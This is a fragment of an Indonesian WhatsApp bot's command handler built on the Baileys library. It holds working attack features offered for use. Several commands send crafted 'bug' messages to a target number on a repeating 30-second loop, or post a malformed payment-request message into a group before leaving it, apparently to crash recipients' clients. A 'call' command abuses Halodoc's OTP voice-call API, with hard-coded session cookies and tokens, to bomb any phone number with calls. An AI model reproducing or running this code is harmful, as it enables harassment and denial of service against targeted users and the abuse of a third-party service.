if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
reply('Berhasil mengirim 1 bug!')
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
reply('Loading 30Second...')
function delay30d(i) { setTimeout(() => {
reply(`Berhasil mengirim ${Number(i) + 2} bug!`)
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
delay30d(++i)}, 30000)}
delay30d(0)
limitin(5)
reply(`Limit Berkurang 5`)
break

//©from: dennis x haikal
case 'buggc':
if (!isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
await sleep(3000)
await semar.groupLeave(from)
break

//©from: dennis
case 'autobug':
if (!isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (args.length < 1) return sendButMessage(from, `silahkan pilih opsi berikut`, '', [{ buttonId: `autobug on`, buttonText: { displayText: "ON" }, type: 1},{ buttonId: `autobug off`, buttonText: { displayText: "OFF" }, type: 1}], {quoted:msg})
if (dn === 'on'){ autobug = true
reply('Sukses')
} else if (dn === 'off'){ autobug = false
reply('Sukses')} else { reply('Error')}
break

//©from: dennis x baileys
case '01':
sendButMessage(from, 'test', 'test', [{buttonId: `${prefix}01`, buttonText: {displayText: 'Button 1'}, type: 1},{buttonId: `${prefix}02`, buttonText: {displayText: 'Button 2'}, type: 1},{buttonId: `${prefix}03`, buttonText: {displayText: 'Button 3'}, type: 1}], {quoted:msg})
break

//©from: dennis x baileys
case '02':
sendButTemplate(from, 'test', 'test', [{index: 1, urlButton: {displayText: 'test', url: 'https://'}},{index: 2, callButton: {displayText: 'test', phoneNumber: '6285'}},{index: 3, quickReplyButton: {displayText: 'test', id: `0`}}])
break

//©from: dennis x baileys
case '03':
sendLstMessage(from, 'test', 'test', 'test', 'test', [{title: "Section 1",rows: [{title: "Option 1", rowId: "option1"},{title: "Option 2", rowId: "option2", description: "This is a description"}]},{title: "Section 2",rows: [{title: "Option 3", rowId: "option3"},{title: "Option 4", rowId: "option4", description: "This is a description V2"}]}])
break

//©from: dennis x rasi tech
case 'addlimit':
if (!isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!dn) return reply('Invalid number')
nd = dn.split("|")
addlimit(`${nd[0]}`, `${nd[1]}`)
semar.sendMessage(`${nd[0]}@s.whatsapp.net`, {text:`Halo, Anda Mendapatkan ${nd[1]} Limit Dari Owner!\nUntuk Mengecek Limit Silahkan Ketik ${prefix}ceklimit`})
reply(`Sukses Add Limit ${nd[0]} - ${nd[1]}`)
break

//©from: dennis
case 'ceklimit': case 'limit':
var limitnye = fs.readFileSync(path);
reply(`Limit Anda : ${limitnye}`)
break

//©from: dennis
case 'chat':
var limit_user = fs.readFileSync(path, function (err) {
if (err) throw err;});
if (limit_user < 1) return reply('Limit Anda Kurang!\nUntuk Menambah Limit Silahkan Chat wa.me/6285866295942');
if (!dn) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim pesan ke nomor ini!')
nd = dn.split("|")
if (!nd) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: `${nd[1]}` })
reply(`Sukses mengirim pesan ${nd[1]} ke nomor ${nd[0]}`)
limitin(3)
reply(`Limit Berkurang 3`)
break

//©from: dennis
case 'join':
if (!isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await semar.groupAcceptInvite(result).then((res) => reply(`${JSON.stringify(res, null, 2)}`)).catch((err) => reply(`${JSON.stringify(err, null, 2)}`))
break

//©from: dennis
case 'leave':
if (!isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
await semar.groupLeave(from).then((res) => reply(`${JSON.stringify(res, null, 2)}`)).catch((err) => reply(`${JSON.stringify(err, null, 2)}`))
break

//©from: dennis
case 'delete': case 'd': case 'del':
semar.sendMessage(from, { delete: { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }})
break

//©from: dennis
case 'restart':
if (!isDev) return
exec(`pm2 restart index`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: dennis
case 'shutdown':
if (!isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 kill`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: dennis × mr_dark
case 'call':
var limit_user = fs.readFileSync(path, function (err) {
if (err) throw err;});
if (limit_user < 1) return reply('Limit Anda Kurang!\nUntuk Menambah Limit Silahkan Chat wa.me/6285866295942');
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} +${senderNumber}`)
var nom = dn
if (!nom.startsWith("+")) nom = "+"+dn
if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +${senderNumber}`)
if (args[0].startsWith('8')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +${senderNumber}`)
if (args[0].startsWith(`+${nomorDeveloper}`)) return reply('Tidak bisa call ke nomor developer!')
if (args[0].startsWith(`+${botNumber}`)) return reply('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nom}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
limitin(3)
reply(`Limit Berkurang 3`)
break

//©from: dennis
case 'public':
if (!isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
mode = true
reply('Sukses mengubah ke mode public')
break

//©from: dennis
case 'private': case 'self':
if (!isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
mode = false
reply('Sukses mengubah ke mode private')
break

//©from: dennis
case 'vote':
var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({"pollCreationMessage": {
"name": "@dcodedenpa",
"options": [{
"optionName": "option 1"
},{
"optionName": "option 2"
},{
"optionName": "option 3"
}],
"selectableOptionsCount": 3}}), { userJid: from })
semar.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
break
default:
}} catch (e) {
console.log(e)
semar.sendMessage("6285866295942@s.whatsapp.net", {text:e})}}